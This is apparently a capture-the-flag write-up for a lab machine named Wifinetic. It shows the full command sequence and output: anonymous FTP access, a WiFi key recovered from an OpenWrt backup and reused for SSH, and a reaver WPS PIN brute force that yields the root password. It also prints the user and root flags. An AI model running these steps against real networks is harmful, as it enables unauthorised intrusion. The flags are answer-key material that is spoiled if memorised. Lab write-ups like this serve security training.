## Nmap Scan

I do a `nmap scan`:
```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A 10.10.11.247
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-15 15:27 EDT
Nmap scan report for 10.10.11.247
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.192
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.44 seconds
```


## FTP 

I do the `anonymous` login and I download different files:
```sh
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.11.247      
Connected to 10.10.11.247.
220 (vsFTPd 3.0.3)
Name (10.10.11.247:kali): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44377|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
226 Directory send OK.
ftp> ls
229 Entering Extended Passive Mode (|||45627|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
226 Directory send OK.
ftp> put MigrateOpenWrt.txt /home/kali/Wifinetic/MigrateOpenWrt.txt
local: MigrateOpenWrt.txt remote: /home/kali/Wifinetic/MigrateOpenWrt.txt
ftp: Can't open `MigrateOpenWrt.txt': No such file or directory
ftp> get MigrateOpenWrt.txt /home/kali/Wifinetic/MigrateOpenWrt.txt
local: /home/kali/Wifinetic/MigrateOpenWrt.txt remote: MigrateOpenWrt.txt
229 Entering Extended Passive Mode (|||42655|)
150 Opening BINARY mode data connection for MigrateOpenWrt.txt (4434 bytes).
100% |**********************************************************************|  4434       23.36 MiB/s    00:00 ETA
226 Transfer complete.
4434 bytes received in 00:00 (34.44 KiB/s)
ftp> get ProjectGreatMigration.pdf /home/kali/Wifinetic/ProjectGreatMigration.pdf
local: /home/kali/Wifinetic/ProjectGreatMigration.pdf remote: ProjectGreatMigration.pdf
229 Entering Extended Passive Mode (|||41557|)
150 Opening BINARY mode data connection for ProjectGreatMigration.pdf (2501210 bytes).
100% |**********************************************************************|  2442 KiB  871.90 KiB/s    00:00 ETA
226 Transfer complete.
2501210 bytes received in 00:02 (838.00 KiB/s)
ftp> get ProjectOpenWRT.pdf /home/kali/Wifinetic/ProjectOpenWRT.pdf
local: /home/kali/Wifinetic/ProjectOpenWRT.pdf remote: ProjectOpenWRT.pdf
229 Entering Extended Passive Mode (|||43667|)
150 Opening BINARY mode data connection for ProjectOpenWRT.pdf (60857 bytes).
100% |**********************************************************************| 60857      214.93 KiB/s    00:00 ETA
226 Transfer complete.
60857 bytes received in 00:00 (147.82 KiB/s)
ftp> get backup-OpenWrt-2023-07-26.tar /home/kali/Wifinetic/backup-OpenWrt-2023-07-26.tar
local: /home/kali/Wifinetic/backup-OpenWrt-2023-07-26.tar remote: backup-OpenWrt-2023-07-26.tar
229 Entering Extended Passive Mode (|||41354|)
150 Opening BINARY mode data connection for backup-OpenWrt-2023-07-26.tar (40960 bytes).
100% |**********************************************************************| 40960      247.62 KiB/s    00:00 ETA
226 Transfer complete.
40960 bytes received in 00:00 (143.64 KiB/s)
ftp> get employees_wellness.pdf /home/kali/Wifinetic/employees_wellness.pdf
local: /home/kali/Wifinetic/employees_wellness.pdf remote: employees_wellness.pdf
229 Entering Extended Passive Mode (|||41681|)
150 Opening BINARY mode data connection for employees_wellness.pdf (52946 bytes).
100% |**********************************************************************| 52946      223.83 KiB/s    00:00 ETA
226 Transfer complete.
52946 bytes received in 00:00 (149.35 KiB/s)
ftp> 
```

## Foothold

I extract the files from `backup-OpenWrt-2023-07-26.tar`:
```sh
┌──(kali㉿kali)-[~/Wifinetic]
└─$ tar -xf  backup-OpenWrt-2023-07-26.tar

┌──(kali㉿kali)-[~/Wifinetic]
└─$ ls
backup-OpenWrt-2023-07-26.tar  etc                 ProjectGreatMigration.pdf
employees_wellness.pdf         MigrateOpenWrt.txt  ProjectOpenWRT.pdf

┌──(kali㉿kali)-[~/Wifinetic]
└─$ tree etc                              
etc
├── config
│   ├── dhcp
│   ├── dropbear
│   ├── firewall
│   ├── luci
│   ├── network
│   ├── rpcd
│   ├── system
│   ├── ucitrack
│   ├── uhttpd
│   └── wireless
├── dropbear
│   ├── dropbear_ed25519_host_key
│   └── dropbear_rsa_host_key
├── group
├── hosts
├── inittab
├── luci-uploads
├── nftables.d
│   ├── 10-custom-filter-chains.nft
│   └── README
├── opkg
│   └── keys
│       └── 4d017e6f1ed5d616
├── passwd
├── profile
├── rc.local
├── shells
├── shinit
├── sysctl.conf
├── uhttpd.crt
└── uhttpd.key

7 directories, 26 files
```

I read the `passwd` file:
```sh
┌──(kali㉿kali)-[~/Wifinetic/etc]
└─$ cat passwd 
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

I see different users:
```sh
┌──(kali㉿kali)-[~/Wifinetic/etc]
└─$ cat passwd | grep /home
ftp:*:55:55:ftp:/home/ftp:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

Now I can enumerate the `etc` directory and I discover a password:
```sh
┌──(kali㉿kali)-[~/Wifinetic/etc]
└─$ cd config              

┌──(kali㉿kali)-[~/Wifinetic/etc/config]
└─$ cat wireless           

config wifi-device 'radio0'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim0'
        option cell_density '0'
        option channel 'auto'
        option band '2g'
        option txpower '20'

config wifi-device 'radio1'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim1'
        option channel '36'
        option band '5g'
        option htmode 'HE80'
        option cell_density '0'

config wifi-iface 'wifinet0'
        option device 'radio0'
        option mode 'ap'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
        option wps_pushbutton '1'

config wifi-iface 'wifinet1'
        option device 'radio1'
        option mode 'sta'
        option network 'wwan'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
```

Credentials:
```
- Username: netadmin
- Password: VeRyUniUqWiFIPasswrd1!
```

I login to ssh like netadmin and I find the `user flag`:
```
┌──(kali㉿kali)-[~]
└─$ ssh netadmin@10.10.11.247
netadmin@10.10.11.247's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 15 Sep 2023 08:44:01 PM UTC

  System load:            0.4
  Usage of /:             71.6% of 4.76GB
  Memory usage:           11%
  Swap usage:             0%
  Processes:              228
  Users logged in:        0
  IPv4 address for eth0:  10.10.11.247
  IPv6 address for eth0:  dead:beef::250:56ff:feb9:275e
  IPv4 address for wlan0: 192.168.1.1
  IPv4 address for wlan1: 192.168.1.23


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Sep 15 20:06:03 2023 from 10.10.16.30
netadmin@wifinetic:~$ ls
 user.txt
netadmin@wifinetic:~$ cat user.txt
a736506bf4cd36cd3e179ec0f9bc9ac6
netadmin@wifinetic:~$ 
```


## Privilege Escalation

I check the `network interfaces`:
```sh
netadmin@wifinetic:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:feb9:5b8e  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:5b8e  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:5b:8e  txqueuelen 1000  (Ethernet)
        RX packets 9710  bytes 1692995 (1.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8675  bytes 4929079 (4.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8750  bytes 525392 (525.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8750  bytes 525392 (525.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 44609  bytes 7855748 (7.8 MB)
        RX errors 0  dropped 44571  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 1489  bytes 141260 (141.2 KB)
        RX errors 0  dropped 203  overruns 0  frame 0
        TX packets 1735  bytes 201893 (201.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 438  bytes 60545 (60.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1478  bytes 166300 (166.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

I check the `wireless network interfaces`:
```sh
netadmin@wifinetic:~$ iwconfig
lo        no wireless extensions.

wlan1     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
wlan0     IEEE 802.11  Mode:Master  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
eth0      no wireless extensions.

hwsim0    no wireless extensions.

wlan2     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```


I discover the `addresses`:
```sh
netadmin@wifinetic:~$ iw dev
phy#2
        Interface mon0
                ifindex 7
                wdev 0x200000002
                addr 02:00:00:00:02:00
                type monitor
                txpower 20.00 dBm
        Interface wlan2
                ifindex 5
                wdev 0x200000001
                addr 02:00:00:00:02:00
                type managed
                txpower 20.00 dBm
phy#1
        Unnamed/non-netdev interface
                wdev 0x10000006d
                addr 42:00:00:00:01:00
                type P2P-device
                txpower 20.00 dBm
        Interface wlan1
                ifindex 4
                wdev 0x100000001
                addr 02:00:00:00:01:00
                ssid OpenWrt
                type managed
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
phy#0
        Interface wlan0
                ifindex 3
                wdev 0x1
                addr 02:00:00:00:00:00
                ssid OpenWrt
                type AP
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
```


I  get the `capabilities` for all the files recursively under the given directories:
```sh
netadmin@wifinetic:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

I discover a useful tool to discover root password, I perform a `brute force attack` against an access point’s WiFi:
```sh
netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv  -c 1

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching mon0 to channel 1
[+] Waiting for beacon from 02:00:00:00:00:00
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
```

Credentials:
```
- Username: root
- Password: WhatIsRealAnDWhAtIsNot51121!
```


I can use the `WPA PSK` to login like root:
```sh
netadmin@wifinetic:~$ su root
Password: 
root@wifinetic:/home/netadmin# whoami
root
root@wifinetic:/home/netadmin# cd /root/ && ls -all
total 40
drwx------  7 root root 4096 Sep 11 17:24 .
drwxr-xr-x 20 root root 4096 Sep 11 16:40 ..
drwxr-xr-x  3 root root 4096 Aug  8 15:16 .ansible
lrwxrwxrwx  1 root root    9 Jan 20  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Aug  8 15:16 .cache
drwxr-xr-x  3 root root 4096 Aug  8 15:16 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
lrwxrwxrwx  1 root root    9 Sep  7 14:19 .python_history -> /dev/null
-rw-r-----  1 root root   33 Sep 17 11:42 root.txt
drwxr-xr-x  3 root root 4096 Aug  8 15:16 snap
drwx------  2 root root 4096 Aug  8 15:16 .ssh
```

I get the `root flag`:
```
root@wifinetic:~# cat root.txt
0d225f66660245ce6f489fa7b2997ab1
```